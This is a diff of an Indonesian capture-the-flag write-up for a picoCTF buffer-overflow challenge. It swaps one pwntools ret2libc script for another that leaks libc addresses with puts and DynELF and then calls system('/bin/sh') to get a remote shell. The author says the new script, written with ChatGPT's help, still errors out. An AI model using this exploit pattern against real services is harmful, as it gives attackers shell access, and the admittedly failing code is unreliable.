@@ -67,70 +67,138 @@ Saya menjalankan scriptnya di kali linux karena di windows ternyata error dan ha
 </div>
 </br>
 
-Note: Saya ingin jujur ko, di step yang akan dijelaskan selanjutnya, saya mengikuti bantuan ChatGPT terutama dalam pembuatan script.
+Note 1: Saya ingin jujur ko, di step yang akan dijelaskan selanjutnya, saya mengikuti bantuan ChatGPT terutama dalam pembuatan script.
 
-Selanjutnya, setelah mengetahui offset, saya mencari address dari fungsi-fungsi yang ada di libc. Tujuan akhir alamat yang ingin diambil adalah alamat fungsi system. Selain fungsi, string /bin/sh juga saya cari untuk menjalankan shell di remote server.
+Note 2: Script yang saya buat dengan bantuan GPT, saat dijalankan selalu mengalami error. Tetapi, di bawah akan saya jelaskan ide dari script yang saya buat. Maaf, ko.
 
-Saya dengan bantuan ChatGPT membuat script untuk eksploitasi (Penjelasan script ada di bawah setelah script).
+Selanjutnya, setelah mengetahui offset, saya mencari address dari fungsi-fungsi yang ada di libc. Tujuan akhir alamat yang ingin diambil adalah alamat fungsi **system**. Selain fungsi, string **/bin/sh** juga saya cari untuk menjalankan shell di remote server.
+
+Selanjutnya, saya dengan bantuan ChatGPT membuat script untuk eksploitasinya. Pertama, saya membuat fungsi `leak` yang berfungsi untuk nge-leak address dari fungsi yang ada di libc dengan ROP. Fungsi ini akan mengembalikan alamat yang di-leak.
+
+```python
+def leak(address):
+
+    log.info(f"Leaking data from address: {hex(address)}")
+    
+    rop = ROP(elf)
+    rop.call(elf.plt['puts'], [address])  # Memanggil puts(address)
+    rop.call(main_addr)  # Kembali ke main setelah memanggil puts
+
+    payload = flat({offset: rop.chain()})
+    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload) 
+    p.recvline()
+    leaked_data = p.recvline().strip()
+    
+    log.info(f"Leaked data: {leaked_data}")
+    return leaked_data.ljust(8, b'\x00')  
+```
+
+Secara garis besar, fungsi di atas bekerja dengan membuat ROP chain dengan berisi fungsi `puts` pada plt dan address `main` lalu payload dikirim dan server akan mengembalikan address `puts` dari libc.
+
+Selanjutnya, saya membuat fungsi `dynelf_exploit` untuk mendapatkan alamat fungsi `system` dan string `/bin/bash`.
+
+```python
+def dynelf_exploit():
+
+    log.info("Starting DynELF...")
+    dynelf = DynELF(leak, elf=elf)  # Inisialisasi DynELF dengan fungsi leak
+    system_addr = dynelf.lookup('system', 'libc')  # Cari alamat fungsi system
+    bin_sh_addr = next(dynelf.iter_strings('/bin/sh'))  # Cari string '/bin/sh'
+    log.success(f"system: {hex(system_addr)}, /bin/sh: {hex(bin_sh_addr)}")
+    return system_addr, bin_sh_addr
+```
+
+Fungsi di atas akan menggunakan DynELF untuk memanggil fungsi leak dengan binary ELF dari binary yang didapat dari soal. Setelah mendapatkan address dari fungsi `leak`, dicari address dari `system` dan `/bin/sh`. Lalu, fungsi ini akan me-return kedua address tersebut.
+
+Pada fungsi `exploit` ini, saya mulai eksploitasi. 
+
+```python
+def exploit():
+
+    system_addr, bin_sh_addr = dynelf_exploit()
+
+    log.info("Sending final payload to spawn shell...")
+    rop = ROP(elf)
+    rop.call(system_addr, [bin_sh_addr])  # Memanggil system("/bin/sh")
+    final_payload = flat({offset: rop.chain()})
+    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", final_payload)
+
+    # Berikan shell interaktif
+    p.interactive()
+```
+Fungsi ini akan pertama-tama mencari address dari `system` dan `/bin/sh` menggunakan fungsi `dynelf_exploit` di atas. Selanjutnya menggunakan ROP yang berisikan `system("/bin/sh")` sebagai payload yang akan dikirimkan dan mendapatkan shell.
+
+Tetapi, dari code ini, masih terjadi error yang saya juga bingung solve nya bagaimana. Berikut errornya:
+
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/71c5da90-7308-41b4-8fc2-77edc1309386">
+</div>
+</br>
+
+Error ini terjadi ketika script sudah mendapatkan beberapa address, lalu terjadi error ini. Mohon maaf ko, saya sudah berusaha. Jika saya ada ide untuk solve ini, saya akan edit write up ini.
+
+### FULL SCRIPT CODE
 
 ```python
 from pwn import *
 
-binary = './vuln_patched'  # Nama binary
-libc_path = './libc.so.6'  # Nama file libc
+binary = './vuln'  # Nama binary
 elf = ELF(binary)
-libc = ELF(libc_path)
+context.binary = elf
 
-puts_plt = elf.plt['puts']
+# Alamat GOT dari puts dan fungsi main
 puts_got = elf.got['puts']
 main_addr = elf.symbols['main']
 
+# Offset buffer overflow
 offset = 136
 
-host = 'mercury.picoctf.net'
-port = 49464
+# Remote target
+p = remote('mercury.picoctf.net', 49464)
 
-def leak_libc_address(proc, func_got):
-    log.info(f"Leaking {func_got} address...")
-    rop = ROP(elf)
-    rop.call(puts_plt, [func_got])  # Cetak alamat fungsi di GOT
-    rop.call(main_addr)  # Kembali ke fungsi main untuk eksploitasi ulang
+def leak(address):
+
+    log.info(f"Leaking data from address: {hex(address)}")
     
-    payload = flat({offset: rop.chain()})
-    proc.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload)
-    leaked_address = u64(proc.recvline().strip().ljust(8, b'\x00'))
-    log.success(f"Leaked {func_got} address: {hex(leaked_address)}")
-    return leaked_address
-
-def exploit(proc):
-    # Leak libc puts address
-    libc_puts = leak_libc_address(proc, puts_got)
-
-    # Hitung base address libc
-    libc_base = libc_puts - libc.symbols['puts']
-    log.success(f"Libc base address: {hex(libc_base)}")
-
-    # Hitung alamat "/bin/sh" dan system
-    system_addr = libc_base + libc.symbols['system']
-    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
-
-    log.info(f"System address: {hex(system_addr)}")
-    log.info(f"/bin/sh address: {hex(bin_sh_addr)}")
-
-    # ROP chain untuk mendapatkan shell
     rop = ROP(elf)
-    rop.call(system_addr, [bin_sh_addr])
+    rop.call(elf.plt['puts'], [address])  # Memanggil puts(address)
+    rop.call(main_addr)  # Kembali ke main setelah memanggil puts
 
     payload = flat({offset: rop.chain()})
-    proc.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload)
+    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload) 
+    p.recvline()
+    leaked_data = p.recvline().strip()
+    
+    log.info(f"Leaked data: {leaked_data}")
+    return leaked_data.ljust(8, b'\x00')  
 
-    # Berikan akses interaktif
-    proc.interactive()
+def dynelf_exploit():
+
+    log.info("Starting DynELF...")
+    dynelf = DynELF(leak, elf=elf)  # Inisialisasi DynELF dengan fungsi leak
+    system_addr = dynelf.lookup('system', 'libc')  # Cari alamat fungsi system
+    bin_sh_addr = next(dynelf.iter_strings('/bin/sh'))  # Cari string '/bin/sh'
+    log.success(f"system: {hex(system_addr)}, /bin/sh: {hex(bin_sh_addr)}")
+    return system_addr, bin_sh_addr
+
+def exploit():
+   
+    # Mulai eksploitasi dengan DynELF
+    system_addr, bin_sh_addr = dynelf_exploit()
+
+    # Payload akhir untuk memanggil system("/bin/sh")
+    log.info("Sending final payload to spawn shell...")
+    rop = ROP(elf)
+    rop.call(system_addr, [bin_sh_addr])  # Memanggil system("/bin/sh")
+    final_payload = flat({offset: rop.chain()})
+    p.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", final_payload)
+
+    # Berikan shell interaktif
+    p.interactive()
 
 if __name__ == "__main__":
-    context.binary = elf
-    p = remote(host, port)
-    exploit(p)
+    exploit()
+
 ```
 
 
